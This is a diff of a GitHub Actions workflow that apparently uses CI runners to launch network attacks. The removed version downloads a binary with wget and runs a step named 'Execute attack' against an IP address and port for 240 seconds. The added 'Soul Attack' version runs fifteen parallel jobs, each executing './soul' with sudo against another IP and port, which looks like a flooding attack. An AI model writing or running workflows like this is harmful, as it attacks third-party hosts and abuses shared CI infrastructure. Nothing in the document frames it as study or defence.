@@ -1,28 +1,13 @@
-name: Deployment Job
-on: [push, workflow_dispatch]
+name: Soul Attack
+on: [push]
 
 jobs:
-  attack:
-    runs-on: ubuntu-latest
+  soul:
+    runs-on: ubuntu-22.04
+    strategy:
+      matrix:
+        n: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15]
     steps:
-    - name: Checkout code
-      uses: actions/checkout@v3
-    
-    - name: Setup environment
-      run: |
-        apt-get update
-        apt-get install -y wget curl
-        
-    - name: Download binary
-      run: |
-        wget -q https://github.com/user/bin/raw/main/process -O process
-        chmod +x process
-        
-    - name: Execute attack
-      run: |
-        timeout 240 ./process 34.0.12.34 20316 240 999
-        
-    - name: Cleanup
-      run: |
-        rm -f process
-        echo "Attack completed at $(date)"
+    - uses: actions/checkout@v3
+    - run: chmod +x soul
+    - run: sudo ./soul 20.198.74.78 21286 200 999
